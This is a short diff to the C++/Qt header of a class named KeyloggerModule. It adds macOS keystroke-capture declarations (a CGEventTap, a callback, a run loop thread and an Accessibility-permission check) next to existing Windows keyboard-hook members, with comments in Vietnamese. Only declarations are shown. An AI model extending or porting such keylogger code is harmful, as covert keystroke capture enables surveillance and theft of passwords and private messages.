@@ -6,6 +6,10 @@
 #include <QStringList>
 #include <QMutex>
 
+#ifdef Q_OS_MACOS
+#include <QThread>
+#endif
+
 class KeyloggerModule : public QObject
 {
     Q_OBJECT
@@ -36,6 +40,24 @@ private:
     static KeyloggerModule* instance;
     static void* hookHandle;   // HHOOK
     static long __stdcall keyboardProc(int nCode, unsigned long long wParam, long long lParam);
+#endif
+
+#ifdef Q_OS_MACOS
+    // macOS CGEventTap
+    static KeyloggerModule* instance;
+    void* eventTap;       // CFMachPortRef
+    void* runLoopSource;  // CFRunLoopSourceRef
+    QThread* tapThread;
+
+    // Callback cho CGEventTap
+    static void* eventCallback(void* proxy, unsigned long type,
+                               void* event, void* userInfo);
+
+    // Chạy run loop trong thread riêng
+    void runMacEventLoop();
+
+    // Kiểm tra Accessibility permission
+    bool checkAccessibilityPermission();
 #endif
 };
 
